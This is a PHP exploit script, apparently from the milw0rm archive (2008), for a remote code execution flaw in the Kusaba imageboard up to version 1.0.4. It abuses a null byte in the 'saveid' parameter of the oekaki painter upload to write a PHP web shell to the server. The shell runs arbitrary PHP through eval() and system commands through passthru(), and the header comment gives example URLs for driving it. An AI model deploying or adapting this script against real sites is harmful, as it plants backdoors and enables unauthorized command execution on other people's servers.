<?php

/**********************************
9 Oct 2008
Kusaba <= 1.0.4 Remote Code Execution
Sausage <tehsausage@gmail.com>

After execution:
http://www.kusaba.image.board/url/kasubaoek/oekaki.php?pc=print "Hello";
http://www.kusaba.image.board/url/kasubaoek/oekaki.php?sc=echo Hello
**********************************/

$shellname = 'oekaki.php'; // any filename ending in php
$server = 'http://www.kusaba.image.board/url/'; // BBS website, with
trailing slash
$image = file_get_contents('test.jpg'); // image to upload (any valid
picture)
$magicquotes = true;

if ($magicquotes)
{
	$shellcode = <<<endSHELL
<?php
isset(\$_GET['pc'])?(eval(urldecode(stripslashes(\$_GET['pc'])))):(isset(\$_GET['sc'])?(passthru(urldecode(stripslashes(\$_GET['sc'])))):(header('Location:
../')));
endSHELL;
}
else
{
	$shellcode = <<<endSHELL
<?php 
isset(\$_GET['pc'])?(eval(urldecode(\$_GET['pc']))):(isset(\$_GET['sc'])?(passthru(urldecode(\$_GET['sc']))):(header('Location:
../')));
endSHELL;
}

$adata = array(
	'No clue' => 'what this is for',
);

function build_data($adata)
{
	$data = '';
	foreach ($adata as $k => $v)
	{
		$data .= "$k=$v;";
	}
	return substr($data,0,-1);
}

function data_len($data)
{
	return str_pad(strlen($data),8,'0',STR_PAD_LEFT);
}

$request = new
HttpRequest($server.'paint_save.php?applet=shipainter&saveid='.$shellname.'%00',HttpRequest::METH_POST);
$data = build_data($adata);
$imagedata = $image;
$animationdata = $shellcode;
$request->setRawPostData("S".data_len($data).$data.data_len($imagedata).'xx'.$imagedata.data_len($animationdata).$animationdata);

echo $request->send()->getBody();

# milw0rm.com [2008-10-09]
